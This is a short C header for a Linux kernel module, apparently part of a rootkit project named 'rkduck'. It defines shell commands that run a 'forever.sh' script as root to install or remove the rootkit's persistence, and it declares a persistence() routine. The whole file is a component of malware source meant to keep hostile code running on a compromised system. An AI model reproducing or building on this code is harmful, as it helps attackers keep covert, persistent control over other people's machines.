#ifndef _PERSISTENCE_H_
#define _PERSISTENCE_H_

#include <linux/module.h>

#define FOREVER_START "/bin/bash /root/rkduck/forever.sh install"
#define FOREVER_STOP "/bin/bash /root/rkduck/forever.sh remove"

void persistence(void);

#endif /* _PERSISTENCE_H_ */